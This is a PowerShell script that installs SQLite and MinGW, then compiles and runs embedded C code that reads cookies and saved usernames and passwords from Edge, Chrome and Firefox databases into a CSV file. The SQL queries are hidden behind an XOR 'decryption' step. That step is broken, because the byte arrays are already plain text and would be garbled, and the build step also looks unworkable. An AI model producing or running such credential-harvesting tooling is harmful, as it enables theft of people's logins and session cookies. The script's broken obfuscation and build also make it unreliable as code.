# Define the URLs for the downloads
$sqliteUrl = "https://www.sqlite.org/2024/sqlite-tools-win32-x86-3410200.zip"
$mingwUrl = "https://sourceforge.net/projects/mingw-w64/files/latest/download"
$zipFilePath = "$env:TEMP\sqlite-tools.zip"
$mingwZipPath = "$env:TEMP\mingw-w64.zip"
$sqliteExtractPath = "$env:ProgramFiles\SQLite"
$mingwExtractPath = "$env:ProgramFiles\mingw-w64"

# Download the SQLite tools ZIP file
Write-Output "Downloading SQLite tools..."
Invoke-WebRequest -Uri $sqliteUrl -OutFile $zipFilePath

# Create the extraction directory if it doesn't exist
if (-Not (Test-Path -Path $sqliteExtractPath)) {
    New-Item -ItemType Directory -Path $sqliteExtractPath
}

# Extract the SQLite ZIP file
Write-Output "Extracting SQLite tools..."
Expand-Archive -Path $zipFilePath -DestinationPath $sqliteExtractPath

# Add SQLite to the system PATH
Write-Output "Adding SQLite to the system PATH..."
$envPath = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
if (-Not $envPath.Contains($sqliteExtractPath)) {
    [System.Environment]::SetEnvironmentVariable("Path", "$envPath;$sqliteExtractPath", [System.EnvironmentVariableTarget]::Machine)
}

# Clean up SQLite ZIP file
Remove-Item -Path $zipFilePath

# Download MinGW-w64
Write-Output "Downloading MinGW-w64..."
Invoke-WebRequest -Uri $mingwUrl -OutFile $mingwZipPath

# Create the extraction directory if it doesn't exist
if (-Not (Test-Path -Path $mingwExtractPath)) {
    New-Item -ItemType Directory -Path $mingwExtractPath
}

# Extract the MinGW-w64 ZIP file
Write-Output "Extracting MinGW-w64..."
Expand-Archive -Path $mingwZipPath -DestinationPath $mingwExtractPath

# Add MinGW-w64 to the system PATH
Write-Output "Adding MinGW-w64 to the system PATH..."
$mingwBinPath = "$mingwExtractPath\mingw64\bin"
if (-Not $envPath.Contains($mingwBinPath)) {
    [System.Environment]::SetEnvironmentVariable("Path", "$envPath;$mingwBinPath", [System.EnvironmentVariableTarget]::Machine)
}

# Clean up MinGW-w64 ZIP file
Remove-Item -Path $mingwZipPath

# Define the C code
$cCode = @'
#include <stdio.h>
#include <sqlite3.h>
#include <stdlib.h>
#include <string.h>

void decrypt(char *str) {
    while (*str) {
        *str = *str ^ 0xAA; // Simple XOR decryption
        str++;
    }
}

void write_to_csv(FILE *file, const char *type, const char *col1, const char *col2, const char *col3) {
    fprintf(file, "%s,%s,%s,%s\n", type, col1, col2, col3);
}

void a(sqlite3 *b, FILE *file) {
    sqlite3_stmt *c;
    char d[] = {0x53, 0x45, 0x4c, 0x45, 0x43, 0x54, 0x20, 0x68, 0x6f, 0x73, 0x74, 0x5f, 0x6b, 0x65, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x6d, 0x65, 0x2c, 0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x20, 0x46, 0x52, 0x4f, 0x4d, 0x20, 0x63, 0x6f, 0x6f, 0x6b, 0x69, 0x65, 0x73, 0x00};
    decrypt(d);
    int e = sqlite3_prepare_v2(b, d, -1, &c, 0);

    if (e != SQLITE_OK) {
        fprintf(stderr, "Failed to fetch cookies: %s\n", sqlite3_errmsg(b));
        return;
    }

    while (sqlite3_step(c) == SQLITE_ROW) {
        write_to_csv(file, "Cookie",
                     (const char *)sqlite3_column_text(c, 0),
                     (const char *)sqlite3_column_text(c, 1),
                     (const char *)sqlite3_column_text(c, 2));
    }

    sqlite3_finalize(c);
}

void f(sqlite3 *b, FILE *file) {
    sqlite3_stmt *c;
    char d[] = {0x53, 0x45, 0x4c, 0x45, 0x43, 0x54, 0x20, 0x6f, 0x72, 0x69, 0x67, 0x69, 0x6e, 0x5f, 0x75, 0x72, 0x6c, 0x2c, 0x20, 0x75, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x5f, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x2c, 0x20, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x5f, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x20, 0x46, 0x52, 0x4f, 0x4d, 0x20, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0x73, 0x00};
    decrypt(d);
    int e = sqlite3_prepare_v2(b, d, -1, &c, 0);

    if (e != SQLITE_OK) {
        fprintf(stderr, "Failed to fetch passwords: %s\n", sqlite3_errmsg(b));
        return;
    }

    while (sqlite3_step(c) == SQLITE_ROW) {
        write_to_csv(file, "Password",
                     (const char *)sqlite3_column_text(c, 0),
                     (const char *)sqlite3_column_text(c, 1),
                     (const char *)sqlite3_column_text(c, 2));
    }

    sqlite3_finalize(c);
}

void g(const char *h, void (*i)(sqlite3 *, FILE *), FILE *file) {
    sqlite3 *b;
    int e = sqlite3_open(h, &b);

    if (e != SQLITE_OK) {
        fprintf(stderr, "Cannot open database %s: %s\n", h, sqlite3_errmsg(b));
        return;
    }

    i(b, file);
    sqlite3_close(b);
}

int main() {
    const char *j = "EdgeCookies.db";
    const char *k = "EdgePasswords.db";
    const char *l = "ChromeCookies.db";
    const char *m = "ChromePasswords.db";
    const char *n = "FirefoxCookies.sqlite";
    const char *o = "FirefoxLogins.sqlite";

    FILE *file = fopen("output.csv", "w");
    if (!file) {
        fprintf(stderr, "Cannot open output.csv for writing\n");
        return 1;
    }

    fprintf(file, "Type,Column1,Column2,Column3\n");

    printf("Reading Edge cookies and passwords...\n");
    g(j, a, file);
    g(k, f, file);

    printf("Reading Chrome cookies and passwords...\n");
    g(l, a, file);
    g(m, f, file);

    printf("Reading Firefox cookies and passwords...\n");
    g(n, a, file);
    g(o, f, file);

    fclose(file);

    return 0;
}
'@

# Write the C code to a file
$cFilePath = "$env:TEMP\read_browser_data.c"
Set-Content -Path $cFilePath -Value $cCode

# Compile the C code using MinGW-w64
Write-Output "Compiling the C code..."
$gccPath = "$mingwBinPath\gcc.exe"
& $gccPath -o "$env:TEMP\read_browser_data.exe" $cFilePath -lsqlite3

Write-Output "Compilation completed successfully!"

# Execute the compiled executable
Write-Output "Executing the compiled program..."
& "$env:TEMP\read_browser_data.exe"

Write-Output "Execution completed. Check output.csv for results."
